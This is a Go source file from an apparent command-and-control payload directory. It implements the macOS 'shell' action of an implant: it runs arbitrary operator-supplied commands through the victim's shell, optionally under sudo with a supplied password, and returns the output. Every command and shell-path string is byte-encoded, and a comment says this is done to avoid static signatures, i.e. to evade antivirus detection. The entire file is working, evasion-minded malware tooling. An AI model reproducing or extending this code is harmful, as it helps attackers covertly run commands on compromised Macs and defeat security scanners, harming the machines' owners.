// server/docker/payloads/Darwin/action_shell_darwin.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"context"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// Shell strings (constructed to avoid static signatures)
var (
	// Command name
	shellCmdName = string([]byte{0x73, 0x68, 0x65, 0x6c, 0x6c}) // shell

	// Flag arguments
	shellFlagSudo    = string([]byte{0x2d, 0x2d, 0x73, 0x75, 0x64, 0x6f})                         // --sudo
	shellFlagTimeout = string([]byte{0x2d, 0x2d, 0x74, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74})       // --timeout

	// Environment variable
	shellEnvShell = string([]byte{0x53, 0x48, 0x45, 0x4c, 0x4c}) // SHELL

	// Shell paths
	shellBinBash    = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})                               // /bin/bash
	shellBinZsh     = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a, 0x73, 0x68})                                     // /bin/zsh
	shellBinSh      = string([]byte{0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})                                           // /bin/sh
	shellUsrBinBash = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68})       // /usr/bin/bash
	shellUsrBinZsh  = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a, 0x73, 0x68})             // /usr/bin/zsh
	shellUsrBinSh   = string([]byte{0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})                   // /usr/bin/sh

	// Fallback shell and arguments
	shellFallback = string([]byte{0x73, 0x68})       // sh
	shellArgC     = string([]byte{0x2d, 0x63})       // -c
)

type ShellCommand struct{}

func (c *ShellCommand) Name() string {
	return shellCmdName
}

// getUnixShell determines the appropriate shell to use on Unix-like systems
func getUnixShell() string {
	// Try to get the user's default shell from SHELL environment variable
	if shell := os.Getenv(shellEnvShell); shell != "" {
		// Verify the shell exists and is executable
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}

	// Fallback chain: try common shells in order of preference
	shells := []string{
		shellBinBash,
		shellBinZsh,
		shellBinSh,
		shellUsrBinBash,
		shellUsrBinZsh,
		shellUsrBinSh,
	}

	for _, shell := range shells {
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}

	// Last resort fallback
	return shellFallback
}
func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: "",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Default timeout
	timeout := 30 * time.Second
	commandArgs := args
	useSudo := false
	sudoPassword := ""

	// Parse flags
	i := 0
	for i < len(args) {
		switch args[i] {
		case shellFlagSudo:
			if i+1 >= len(args) {
				return CommandResult{
					Output:      Err(E20),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			useSudo = true
			sudoPassword = args[i+1]
			i += 2

		case shellFlagTimeout:
			if i+1 >= len(args) {
				return CommandResult{
					Output:      Err(E20),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			timeoutSeconds, err := strconv.Atoi(args[i+1])
			if err != nil || timeoutSeconds <= 0 {
				return CommandResult{
					Output:      ErrCtx(E22, args[i+1]),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			timeout = time.Duration(timeoutSeconds) * time.Second
			i += 2

		default:
			commandArgs = args[i:]
			i = len(args) // Break the loop
		}
	}

	if len(commandArgs) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Join command arguments
	commandStr := strings.Join(commandArgs, " ")

	// Get working directory
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	var output strings.Builder

	var commandOutput string
	var exitCode int
	var cmdErr error

	if useSudo {
		// Use PTY helper for sudo
		ptyHelper := &PTYHelper{timeout: timeout}
		commandOutput, exitCode, cmdErr = ptyHelper.ExecuteWithSudo(sudoPassword, commandStr, workingDir)

	} else {
		// Regular shell execution
		shell := getUnixShell()

		execContext, cancel := context.WithTimeout(context.Background(), timeout)
		defer cancel()

		cmd := exec.CommandContext(execContext, shell, shellArgC, commandStr)
		cmd.Dir = workingDir

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		cmdErr = cmd.Run()

		commandOutput = stdout.String()
		if stderr.Len() > 0 {
			if commandOutput != "" {
				commandOutput += "\n"
			}
			commandOutput += stderr.String()
		}

		if cmdErr != nil {
			if execContext.Err() == context.DeadlineExceeded {
				exitCode = 124
			} else if exitErr, ok := cmdErr.(*exec.ExitError); ok {
				exitCode = exitErr.ExitCode()
			} else {
				exitCode = 1
			}
		}
	}

	output.WriteString(commandOutput)

	if cmdErr != nil && exitCode == 124 {
		output.WriteString("\n" + Err(E9))
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    exitCode,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
